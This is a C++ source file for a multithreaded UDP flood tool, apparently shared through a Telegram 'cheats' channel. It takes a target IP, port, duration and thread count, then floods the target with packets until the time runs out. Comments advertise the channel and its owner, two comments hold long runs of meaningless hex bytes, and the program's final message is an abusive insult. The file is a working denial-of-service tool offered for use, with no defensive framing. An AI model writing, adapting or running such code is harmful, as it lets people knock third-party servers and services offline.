#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20
class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }
// join telegram channel :- https://t.me/+03wLVBPurPk2NWRl owner:- @GODxAloneBOY
    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;
        
        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }
//xc2\x73\x7f\x8d\x46\x2c\x6d\xb1\x4d\x1c\xce\x1b\xb9\x7e\x4d\x49\xfc\x27\xdf\xe3\xb0\x91\x1f\x58\xb4\xc\x5b\xd7\xf2\xb4\xc1\x51\xfb\x24\x4f\x9b\xcf\xb6\x3a\x89\x06\xc4\x4b\xea\x4b\xc3\xb7\x41\x52\xe6\x4c\x05\x4b\xe1\xad\xa6\xd2\xe6\x37\x5a\x23\xac\x3f\xe8\xdf\x05\x83\xb3\xb7\x89\x79\x61\xf2\x7d\x52\xe2\xdf\x6b\x09\xcb\x52\x86\x3a\x4f\x35\x35\xcc\x26\xbd\x21\x2e\xdb\xd1\x6c\xed\x38\xb9\xd0\x13\xf4\xda\x08\x8e\xfe\x5f\x98\xb5\x03\x6e\x03\xe7\x9a\x7f\xef\x88\xec\x98\x57\xfa\x00\x03\x01\x46\x5c\x43\x5c\x20\x13\x0d\xa0\xac\xe3\x2f\x14\x11\x18\x13\x86\x69\x62\x01\xb3\x9c\x4e\x2d\x8d\xf3\x68\x92\x2e\xe0\x6e\xb3\x9f\x6c\x22\x44\x3b\xc4\xaf\x0c\x17\x7f\xe8\xa5\xda\x60\x9a\xc7\x33\xde\x9f\x95\xdc\x53\x89\x00\x26\x78\xe9\xfa\x66\x30\x43\x1b\x67\x18\xa1\xf3\x65\xa7\x4c\x01\x7c\x42\x46\x38\x88\x59\xa3\x84\xdc\x05\xb6\x40\x63\xdd\xb3\xf0\x5f\x08\x64\x4d\x5c\xc8\x1a\x73\xf0\x98\x30\xfd\x5d\x20\x1a\x8f\x96\x89\xbf\xbf\xe6\x21\x8a\xc4\xc6\x21\x3f\x11\x8a\xf6\xb9\x76\xd1\xcb\x00\x6b\x25\x61\xde\x9d\x20\xa3\x46\x02\x0b\xf0\xa1\x07\x5e\x91\xee\x92\x06\xfe\x9b\x42\x45\x66\x7e\x3f\x7b\x2c\xd5\x73\x57\x27\x7e\x24\xb6\x86\x1d\xf7\xee\x7b\x9e\xee\xff\xe0\x5a\x51\x38\x04\x44\xc9\x31\xd7\x29\xda\xd5\x43\x9b\xfb\x3a\xc4\xe8\x75\xb8\x3c\x39\x05\x9b\xcf\x8c\x16\xfd\xe4\xc8\x50\x84\xd0\x24\xee\xed\xee\x02\xd4\xed\x6a\x44\xf2\xd8\x07\x68\x54\xcd\x5b\xbe\x23\xc7\x36\x68\xed\xce\xeb\x29\x9e\x24\x1f\x4d\x22\x22\xcb\x5c\xa2\x97\x3d\x02\x79\x81\xac\xe8\xc1\xdf\xdb\x2e\x73\xcf\x87\xdc\x4a\x08\x29\x2b\xa4\xad\xea\xb7\xd2\
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (time(NULL) <= endtime) {
            ssize_t payload_size = strlen(payload);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }

        close(sock);
    }
//a\xb4\xc5\x45\x36\x24\x18\x41\x44\xfb\x09\x54\x03\x08\x7d\xe4\x67\xe6\xfe\x2e\x12\xfb\x0e\x40\x6d\x28\xfc\xc3\xfc\xf4\x43\x0c\x56\x0b\xdf\x4b\x54\x87\x01\xad\x99\xcb\x9b\x03\xb9\x47\xb7\x9c\xdf\x37\x49\xf8\xcb\x6a\x7b\x86\x1a\x76\x95\x26\x2e\x25\x88\xdc\x6f\x82\xb9\x7a\x79\xf1\x23\x23\xf2\x92\x33\x14\xd6\x5c\x47\x1d\x44\x01\x43\x54\xd2\xfb\xa8\x5d\x3e\xbb\x89\xf8\x54\x02\xea\x5c\x40\x3f\x47\x85\x67\xbd\x1d\xf2\x3b\xbd\x92\xe8\x91\xae\x85\xcb\xe2\xa5\xb5\x4b\x42\x84\x1b\x64\xe5\x27\xff\x47\x40\xa6\xcb\xcc\x20\x56\x88\x01\xc5\xc3\xdc\x2b\x9d\xf8\xb0\xb2\x38\x66\x60\xb5\x96\x2e\xfe\x44\xcc\x01\x97\x49\x2e\xd3\x9c\xe0\xae\x29\xff\x60\x54\xbd\x98\x18\x64\x7a\x20\x90\xaf\xb3\x05\xc0\x86\x39\xce\xc6\x75\xc3\x3e\xfe\x79\xad\xf4\x05\x3e\x9e\xe2\x7c\x27\x81\x32\x58\x74\x08\x3e\x4f\x6a\x51\x04\xa0\xc3\x96\x05\x7e\x31\x61\x17\x31\xfc\x67\x14\x22\xa6\x54\xf2\xbe\xf2\x98\x8b\x73\xa7\x3a\xbe\x45\x4a\xa3\x2c\x1c\x98\x62\xb9\xed\xe3\x43\x5f\xb2\x69\xa5\x89\xb4\x1f\x83\xef\x46\x3d\x10\x30\x99\xdf\x42\x17\x12\x4e
private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./alone ip port duration threads\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }
//join my telegram channel for all files available join my telegram 
    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        
        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            Attack* attack = static_cast<Attack*>(arg);
            attack->attack_thread();
            return nullptr;
        }, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    std::cout << "Teri amma nehen pe aa jaunga. Attack finished laude 😂\n";
    return 0;
}
//owner :- Aloneboy GODxCHEATS 